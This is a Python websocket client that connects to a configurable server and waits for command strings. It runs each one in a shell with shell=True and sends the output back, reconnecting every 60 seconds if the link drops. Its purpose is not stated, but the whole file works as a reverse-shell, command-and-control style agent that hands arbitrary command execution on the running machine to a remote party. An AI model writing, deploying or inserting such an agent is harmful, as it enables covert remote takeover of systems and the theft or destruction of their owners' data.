import asyncio
import datetime
import functools
import json
import click
import random
import subprocess
import websockets

from websockets.exceptions import ConnectionClosedOK


def handle_connection(func):

    @functools.wraps(func)
    async def func_wrapped(url, **kwargs):
        while True:
            try:
                async with websockets.connect(url) as ws:
                    await check_connection(ws)
                    await func(ws, kwargs)
            except (ConnectionRefusedError, ConnectionClosedOK) as err:
                print(err)
                await asyncio.sleep(60)
                continue
            except: # noqa
                raise

    return func_wrapped



async def check_connection(ws):
    await ws.send(
        json.dumps({
            'source': 'client', 'message': 'client connected'
        })
    )


def handle_command(command):
    proc = subprocess.Popen(
        command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True
    )
    return proc.communicate()


@handle_connection
async def client(ws, params={}):
    while True:
        command = await ws.recv()
        if command:
            if command == 'exit':
                raise SystemExit
            result, err = handle_command(command)
            await ws.send(
                json.dumps({
                    'source': 'client',
                    'message': (result if result else err).decode()
                })
            )


@click.command()
@click.option('--host', default='localhost', help='server host, localhost by default')
@click.option('--port', default=10000, help='server port, 10000 by default')
def main(host, port):
    asyncio.run(client(
        f'ws://{host}:{port}/ws/{int(datetime.datetime.now().timestamp())}{random.randint(10, 99)}'
    ))


if __name__ == "__main__":
    main()
